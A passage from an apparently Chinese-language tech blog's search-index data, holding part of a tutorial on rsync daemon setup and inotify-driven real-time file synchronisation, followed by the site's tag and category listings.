/etc/rsync.d/rsyncd.passlog = /var/log/rsyncd.log log format = %t %a %m %f %bsyslog facility = local3 timeout = 300[handbook]path=/handbook/comment= handbooktest auth users=rsync 详细参数可参考官网 rsyncd.conf 介绍 编写用户认证文件1vim ``/etc/rsync``.d``/rsyncd``.pass 修改：将代码模式去除，并添加文字描述 输入以下内容： 1rsync:cloudcare 启动服务1rsync` `--daemon --config=``/etc/rsync``.d``/rsyncd``.conf 修改： 添加了“确认服务启动” 标题，以及相关命令; 将 “注：rsync 服务默认端口是 873” 前移 确认服务启动注：rsync 服务默认端口是 873 确认服务启动 1ps` `-ef | ``grep` `rsync` `netstat` `-nltp | ``grep` `7589 rsync客户端客户端配置很简单，只需要安装 rsync 工具即可 安装方式1sudo` `apt-get ``install` `rsync` `# debian、ubuntu 等在线安装方法；` `yum ``install` `rsync` `# Fedora、Redhat 等在线安装方法；` `rpm -ivh ``rsync` `# Fedora、Redhat 等rpm包安装方法；` `rpm -qa | ``grep` `rsync` `# 查看安装的版本 验证修改：添加了“示例内容” 示例： 将192.168.1.176 服务器上的 handbook （这里是定义的项目名称，可以参考rsync server 端的配置）项目同步到 192.168.1.167 的 /tmp 下 1rsync` `-avzP ``rsync``@192.168.1.176::handbook ``/tmp 1说明： -a 参数，相当于-rlptgoD，-r 是递归 -l 是链接文件，意思是拷贝链接文件；-p 表示保持文件原有权限；-t 保持文件原有时间；-g 保持文件原有用户组；-o 保持文件原有属主；-D 相当于块设备文件； -z 传输时压缩； -P 传输进度； -v 传输时的进度等信息 详细参数可以参考: RSYNC 参数 如果想每隔一段时间同步一次，可以配合 crontab 来实现；但是如果想实时同步，那就需要用到inotify 工具了 inotify inotify是Linux核心子系统之一，做为文件系统的附加功能，它可监控文件系统并将异动通知应用程序。摘自维基百科 可以配合rsync做实时同步，inotify 通过监控文件的变化，然后触发同步脚本，实现实时同步。 修改： 添加了“实验目地” 和“拓扑环境” 两个项目实验目的将 192.168.1.167 的 /handbook 目录下的内容实时同步到 192.168.1.176 定义的 “handbook” 目录下（实验环境依旧采用上面的老环境） 拓扑环境 安装1yum ``install` `-y inotify-tools 注：inotify 其实不需要任何的配置，安装好之后默认有两个命令; inotifywait : 在被监控的文件或目录上等待特定文件系统事件（open close delete等）发生 inotifywatch :收集被监控的文件系统使用的统计数据,指文件系统事件发生的次数统计 使用检测创建事件1inotifywait -mrq ``/handbook/` `cd` `/handbook/` `touch` `1 检测删除事件1inotifywait -mrq ``/handbook` `--timefmt ``&quot;%d-%m-%y %H:%M&quot;` `--``format` `&quot;%T %w%f 事 件 息: %e&quot;` `-e delete ``cd` `/handbook/` `rm` `-rf 1 4 编写实时同步脚本1more rsync-handbook.sh 1#!/bin/bash` `inotifywait -mrq ``/handbook/` `--``format` `&quot;%w%f&quot;` `-e create,delete,moved_to,close_write | ``while` `read` `line ``do` `rsync` `-az ``/handbook/` `rsync``@192.168.1.176::handbook --password-``file``=``/root/handbook``.pw ``done 注： 其中–password-file 是指定 “handbook” 模块认用户认证的密码文件\\ 验证","link":"/2020/05/19/booboo_others/2020-05-20-tec-linux/"}],"tags":[{"name":"宝宝成长","slug":"宝宝成长","link":"/tags/%E5%AE%9D%E5%AE%9D%E6%88%90%E9%95%BF/"},{"name":"培训","slug":"培训","link":"/tags/%E5%9F%B9%E8%AE%AD/"},{"name":"LinuxShell脚本","slug":"LinuxShell脚本","link":"/tags/LinuxShell%E8%84%9A%E6%9C%AC/"},{"name":"Linux基础服务","slug":"Linux基础服务","link":"/tags/Linux%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1/"},{"name":"混合云技术峰会","slug":"混合云技术峰会","link":"/tags/%E6%B7%B7%E5%90%88%E4%BA%91%E6%8A%80%E6%9C%AF%E5%B3%B0%E4%BC%9A/"},{"name":"阿里云","slug":"阿里云","link":"/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"},{"name":"AnalyicDB","slug":"AnalyicDB","link":"/tags/AnalyicDB/"},{"name":"前端","slug":"前端","link":"/tags/%E5%89%8D%E7%AB%AF/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"定制自己的Hexo博客专题","slug":"定制自己的Hexo博客专题","link":"/tags/%E5%AE%9A%E5%88%B6%E8%87%AA%E5%B7%B1%E7%9A%84Hexo%E5%8D%9A%E5%AE%A2%E4%B8%93%E9%A2%98/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"MySQL基础管理","slug":"MySQL基础管理","link":"/tags/MySQL%E5%9F%BA%E7%A1%80%E7%AE%A1%E7%90%86/"},{"name":"SQL优化","slug":"SQL优化","link":"/tags/SQL%E4%BC%98%E5%8C%96/"},{"name":"数据救援","slug":"数据救援","link":"/tags/%E6%95%B0%E6%8D%AE%E6%95%91%E6%8F%B4/"},{"name":"锁故障","slug":"锁故障","link":"/tags/%E9%94%81%E6%95%85%E9%9A%9C/"},{"name":"RDS","slug":"RDS","link":"/tags/RDS/"},{"name":"主从同步","slug":"主从同步","link":"/tags/%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"技术管理","slug":"技术管理","link":"/tags/%E6%8A%80%E6%9C%AF%E7%AE%A1%E7%90%86/"},{"name":"Microsoft","slug":"Microsoft","link":"/tags/Microsoft/"},{"name":"Azure","slug":"Azure","link":"/tags/Azure/"},{"name":"监控告警","slug":"监控告警","link":"/tags/%E7%9B%91%E6%8E%A7%E5%91%8A%E8%AD%A6/"},{"name":"TICK技术栈","slug":"TICK技术栈","link":"/tags/TICK%E6%8A%80%E6%9C%AF%E6%A0%88/"},{"name":"Kapacitor安装","slug":"Kapacitor安装","link":"/tags/Kapacitor%E5%AE%89%E8%A3%85/"},{"name":"TICKscript语言","slug":"TICKscript语言","link":"/tags/TICKscript%E8%AF%AD%E8%A8%80/"},{"name":"Kapcitor命令行","slug":"Kapcitor命令行","link":"/tags/Kapcitor%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"name":"Kapacitor监控案例","slug":"Kapacitor监控案例","link":"/tags/Kapacitor%E7%9B%91%E6%8E%A7%E6%A1%88%E4%BE%8B/"},{"name":"Kapcitor配置文件","slug":"Kapcitor配置文件","link":"/tags/Kapcitor%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"name":"bootstrap","slug":"bootstrap","link":"/tags/bootstrap/"},{"name":"慢SQL","slug":"慢SQL","link":"/tags/%E6%85%A2SQL/"},{"name":"监控","slug":"监控","link":"/tags/%E7%9B%91%E6%8E%A7/"},{"name":"datadog","slug":"datadog","link":"/tags/datadog/"},{"name":"紧急救援","slug":"紧急救援","link":"/tags/%E7%B4%A7%E6%80%A5%E6%95%91%E6%8F%B4/"},{"name":"binlog2sql","slug":"binlog2sql","link":"/tags/binlog2sql/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"Oracle12C","slug":"Oracle12C","link":"/tags/Oracle12C/"},{"name":"OCP","slug":"OCP","link":"/tags/OCP/"},{"name":"57","slug":"57","link":"/tags/57/"},{"name":"jira","slug":"jira","link":"/tags/jira/"},{"name":"项目管理","slug":"项目管理","link":"/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"},{"name":"敏捷开发","slug":"敏捷开发","link":"/tags/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/"},{"name":"MyFlash","slug":"MyFlash","link":"/tags/MyFlash/"},{"name":"在线DDL","slug":"在线DDL","link":"/tags/%E5%9C%A8%E7%BA%BFDDL/"},{"name":"pt-online-schema-change","slug":"pt-online-schema-change","link":"/tags/pt-online-schema-change/"},{"name":"Percona","slug":"Percona","link":"/tags/Percona/"},{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"Github","slug":"Github","link":"/tags/Github/"},{"name":"Gitlab","slug":"Gitlab","link":"/tags/Gitlab/"},{"name":"RedHat","slug":"RedHat","link":"/tags/RedHat/"},{"name":"CentOS","slug":"CentOS","link":"/tags/CentOS/"},{"name":"ntp","slug":"ntp","link":"/tags/ntp/"},{"name":"DBA团队","slug":"DBA团队","link":"/tags/DBA%E5%9B%A2%E9%98%9F/"}],"categories":[{"name":"往昔追忆","slug":"往昔追忆","link":"/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/"},{"name":"小二班","slug":"往昔追忆/小二班","link":"/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%B0%8F%E4%BA%8C%E7%8F%AD/"},{"name":"英语","slug":"往昔追忆/英语","link":"/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E8%8B%B1%E8%AF%AD/"},{"name":"经典语录","slug":"往昔追忆/经典语录","link":"/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E7%BB%8F%E5%85%B8%E8%AF%AD%E5%BD%95/"},{"name":"培训教程","slug":"培训教程","link":"/categories/%E5%9F%B9%E8%AE%AD%E6%95%99%E7%A8%8B/"},{"name":"技术峰会","slug":"技术峰会","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B3%B0%E4%BC%9A/"},{"name":"技术广角","slug":"技术广角","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"},{"name":"LinuxShell脚本教程","slug":"培训教程/LinuxShell脚本教程","link":"/categories/%E5%9F%B9%E8%AE%AD%E6%95%99%E7%A8%8B/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"},{"name":"Linux系统基础培训","slug":"培训教程/Linux系统基础培训","link":"/categories/%E5%9F%B9%E8%AE%AD%E6%95%99%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E5%9F%B9%E8%AE%AD/"},{"name":"Linux简易服务教程","slug":"培训教程/Linux简易服务教程","link":"/categories/%E5%9F%B9%E8%AE%AD%E6%95%99%E7%A8%8B/Linux%E7%AE%80%E6%98%93%E6%9C%8D%E5%8A%A1%E6%95%99%E7%A8%8B/"},{"name":"MySQL基础管理教程","slug":"培训教程/MySQL基础管理教程","link":"/categories/%E5%9F%B9%E8%AE%AD%E6%95%99%E7%A8%8B/MySQL%E5%9F%BA%E7%A1%80%E7%AE%A1%E7%90%86%E6%95%99%E7%A8%8B/"},{"name":"Aliyun","slug":"技术峰会/Aliyun","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B3%B0%E4%BC%9A/Aliyun/"},{"name":"Minos主题优化","slug":"技术广角/Minos主题优化","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Minos%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/"},{"name":"技术思考","slug":"技术广角/技术思考","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/%E6%8A%80%E6%9C%AF%E6%80%9D%E8%80%83/"},{"name":"Oracle","slug":"技术广角/Oracle","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Oracle/"},{"name":"MongoDB","slug":"技术广角/MongoDB","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MongoDB/"},{"name":"MySQL","slug":"技术广角/MySQL","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MySQL/"},{"name":"Python","slug":"技术广角/Python","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Python/"},{"name":"前端","slug":"技术广角/前端","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/%E5%89%8D%E7%AB%AF/"},{"name":"Azure","slug":"技术峰会/Azure","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B3%B0%E4%BC%9A/Azure/"},{"name":"TICK","slug":"TICK","link":"/categories/TICK/"},{"name":"kapacitor","slug":"TICK/kapacitor","link":"/categories/TICK/kapacitor/"},{"name":"PostgreSQL","slug":"技术广角/PostgreSQL","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/PostgreSQL/"},{"name":"datadog","slug":"技术广角/datadog","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/datadog/"},{"name":"OCP","slug":"OCP","link":"/categories/OCP/"},{"name":"Oracle12C","slug":"OCP/Oracle12C","link":"/categories/OCP/Oracle12C/"},{"name":"jira","slug":"技术广角/jira","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/jira/"},{"name":"玩转Git三剑客","slug":"培训教程/玩转Git三剑客","link":"/categories/%E5%9F%B9%E8%AE%AD%E6%95%99%E7%A8%8B/%E7%8E%A9%E8%BD%ACGit%E4%B8%89%E5%89%91%E5%AE%A2/"},{"name":"Git","slug":"技术广角/Git","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Git/"},{"name":"RedHat","slug":"技术广角/RedHat","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/RedHat/"},{"name":"Linux","slug":"技术广角/Linux","link":"/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Linux/"},{"name":"团队家庭聚餐","slug":"往昔追忆/团队家庭聚餐","link":"/categories/%E5%BE%80%E6%98%94%E8%BF%BD%E5%BF%86/%E5%9B%A2%E9%98%9F%E5%AE%B6%E5%BA%AD%E8%81%9A%E9%A4%90/"}]}